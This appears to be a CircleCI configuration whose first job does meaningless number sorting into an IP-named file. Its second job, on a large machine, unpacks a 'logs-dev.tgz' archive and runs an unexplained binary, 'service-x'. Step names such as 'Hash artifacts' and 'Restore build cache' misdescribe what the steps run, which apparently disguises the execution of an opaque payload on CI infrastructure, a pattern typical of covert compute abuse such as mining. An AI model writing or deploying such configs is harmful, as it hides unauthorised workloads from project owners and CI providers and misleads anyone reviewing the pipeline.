version: 2.1

jobs:
  loopCommandAdapter:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Jan 25 Optimization
          command: |
            mkdir -p /tmp/cord
            set +o pipefail 2>/dev/null; seq 1 679279 | awk '{print length($0),$0}' | sort -n | head -n 10000 > /tmp/cord/105.137.198.160; true
            echo "work product: /tmp/cord/105.137.198.160 - $(wc -c </tmp/cord/105.137.198.160) bytes"
      - persist_to_workspace:
          root: /tmp/cord
          paths:
            - '105.137.198.160'
  atlas-rc:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/cord
      - run:
          name: Inspect handoff data
          command: |
            { sort /tmp/cord/105.137.198.160 2>/dev/null || echo "sort-fail"; } > /dev/null; echo done
      - run:
          name: Fetch and expand
          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore build cache
          command: tar --extract --gzip -f logs-dev.tgz
      - run:
          name: Pre-run checks
          command: free -m
      - run:
          command: sleep 45
      - run:
          name: Hash artifacts
          command: uptime
      - run:
          command: "$PWD/service-x"
